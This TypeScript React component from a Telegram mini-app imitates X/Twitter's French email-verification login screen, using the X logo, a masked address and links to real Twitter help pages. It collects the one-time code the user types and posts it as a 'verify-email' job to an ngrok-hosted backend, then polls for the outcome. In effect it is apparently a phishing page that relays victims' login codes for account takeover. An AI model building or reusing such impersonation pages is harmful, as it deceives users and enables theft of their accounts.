//mini-app/src/pages/EmailVerify.tsx
import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import axios from "axios";
import { useSignal, initData } from "@tma.js/sdk-react";
import "./EmailVerify.css";

import type {
  JobsStatusResponse,
  JobCommandResponse,
} from "../../../server/src/types/jobs";

import { FullScreenLoader } from "../components/FullScreenLoader";
import { Toast } from "../components/Toast";

const API_BASE = "https://juiceless-hyo-pretechnical.ngrok-free.dev/api";

export const EmailVerify = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const initDataRaw = useSignal(initData.raw);

  const [username, setUsername] = useState("");
  const [avatarUrl, setAvatarUrl] = useState<string | null>(null);
  const [code, setCode] = useState("");

  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState("");

  useEffect(() => {
    const state = location.state as {
      username?: string;
      avatarUrl?: string;
    } | null;

    if (state?.username) setUsername(state.username);
    if (state?.avatarUrl) setAvatarUrl(state.avatarUrl);
  }, [location.state]);

  const pollCommandUntilDone = async (commandId: string, maxMs = 20000) => {
    const start = Date.now();

    while (Date.now() - start < maxMs) {
      const resp = await axios.post<JobsStatusResponse>(
        `${API_BASE}/jobs/status`,
        { initData: initDataRaw },
        { headers: { "Content-Type": "application/json" } }
      );

      const cs = resp.data.commandState;

      if (!cs) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      if (cs.commandId !== commandId) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      if (cs.status === "pending" || cs.status === "running") {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      return cs;
    }

    return null;
  };

  const handleNext = async () => {
    setToast("");

    if (!initDataRaw) {
      setToast("Telegram initData missing");
      return;
    }

    const otp = code.trim();
    if (!otp) {
      setToast("Please enter the email code");
      return;
    }

    try {
      setLoading(true);

      const cmdResp = await axios.post<JobCommandResponse>(
        `${API_BASE}/jobs/command`,
        {
          initData: initDataRaw,
          command: {
            type: "verify-email",
            payload: { code: otp },
          },
        },
        { headers: { "Content-Type": "application/json" } }
      );

      if (!cmdResp.data.ok) {
        setLoading(false);
        setToast(cmdResp.data.error || "Command failed");
        return;
      }

      const commandId = cmdResp.data.commandId;
      if (!commandId) {
        setLoading(false);
        setToast("Missing commandId from server");
        return;
      }

      const finalState = await pollCommandUntilDone(commandId);

      setLoading(false);

      if (!finalState) {
        setToast("Timeout, please try again");
        return;
      }

      if (finalState.status === "done" && finalState.result?.ok) {
        console.log("✅ EMAIL VERIFY OK", finalState.result);
        navigate("/", { state: { username } });
        return;
      }

      const msg =
        finalState.error ||
        finalState.result?.message ||
        finalState.result?.error ||
        "Invalid email code";
      setToast(msg);
    } catch (err: any) {
      setLoading(false);
      setToast(err.response?.data?.error || err.message || "Network error");
    }
  };

  // Fallbacks pour les données utilisateur
  const displayScreenName = username || "User";
  const displayHandle = username ? `@${username}` : "@username";
  // Pas d'email disponible pour l'instant, on utilise un fallback
  const maskedEmail = "co**********@g****.***";

  return (
    <div className="emailverify-page">
      <FullScreenLoader visible={loading} text="Verifying email..." />
      <Toast message={toast} onClose={() => setToast("")} />

      <div className="emailverify-modal" role="dialog" aria-modal="true">
        {/* Header */}
        <div className="emailverify-header">
          <div className="emailverify-header-content">
            <div className="emailverify-close-button-container">
              <button
                className="emailverify-close-button"
                aria-label="Fermer"
                type="button"
                onClick={() => navigate(-1)}
              >
                <svg
                  viewBox="0 0 24 24"
                  aria-hidden="true"
                  className="emailverify-close-icon"
                >
                  <g>
                    <path d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"></path>
                  </g>
                </svg>
              </button>
            </div>
            <div className="emailverify-logo-container">
              <svg
                viewBox="0 0 24 24"
                aria-label="X"
                role="img"
                className="emailverify-logo"
              >
                <g>
                  <path d="M21.742 21.75l-7.563-11.179 7.056-8.321h-2.456l-5.691 6.714-4.54-6.714H2.359l7.29 10.776L2.25 21.75h2.456l6.035-7.118 4.818 7.118h6.191-.008zM7.739 3.818L18.81 20.182h-2.447L5.29 3.818h2.447z"></path>
                </g>
              </svg>
            </div>
            <div className="emailverify-header-spacer"></div>
          </div>
        </div>

        {/* Content */}
        <div className="emailverify-content">
          <div className="emailverify-title-container">
            <h1 className="emailverify-title" id="modal-header">
              Vérifiez votre adresse email
            </h1>
            <div className="emailverify-description">
              <span>
                Afin de protéger votre compte contre toute activité suspecte,
                nous avons envoyé un code de confirmation à l&apos;adresse{" "}
                {maskedEmail}. Entrez le ci-dessous pour vous connecter.
              </span>
            </div>
          </div>

          {/* User Display */}
          <div className="emailverify-user-display">
            <div className="emailverify-user-avatar">
              {avatarUrl ? (
                <img src={avatarUrl} alt={displayScreenName} />
              ) : (
                <div className="emailverify-user-avatar-fallback">
                  {displayScreenName.charAt(0).toUpperCase()}
                </div>
              )}
            </div>
            <div className="emailverify-user-info">
              <div className="emailverify-user-name">{displayScreenName}</div>
              <div className="emailverify-user-handle">{displayHandle}</div>
            </div>
          </div>

          {/* Form */}
          <div className="emailverify-form">
            <label className="emailverify-label">
              <div className="emailverify-label-text">
                <span>Code de confirmation</span>
              </div>
              <div className="emailverify-input-wrapper">
                <input
                  type="text"
                  name="text"
                  autoComplete="on"
                  autoCapitalize="none"
                  autoCorrect="off"
                  inputMode="text"
                  spellCheck="false"
                  dir="auto"
                  className="emailverify-input"
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  disabled={loading}
                  onKeyDown={(e) => {
                    if (e.key === "Enter" && !loading && code.trim()) {
                      handleNext();
                    }
                  }}
                />
              </div>
            </label>

            <div className="emailverify-links">
              <a
                href="https://help.twitter.com/managing-your-account/additional-information-request-at-login"
                target="_blank"
                rel="noopener noreferrer nofollow"
                className="emailverify-link-button"
              >
                Pourquoi me demande-t-on cette information ?
              </a>
              <a
                href="https://help.twitter.com/forms/account-access/regain-access"
                target="_blank"
                rel="noopener noreferrer nofollow"
                className="emailverify-link-button"
              >
                Signaler un problème
              </a>
            </div>

            <button
              className="emailverify-next-button"
              onClick={handleNext}
              disabled={loading || !code.trim()}
              type="button"
            >
              <span>Suivant</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};
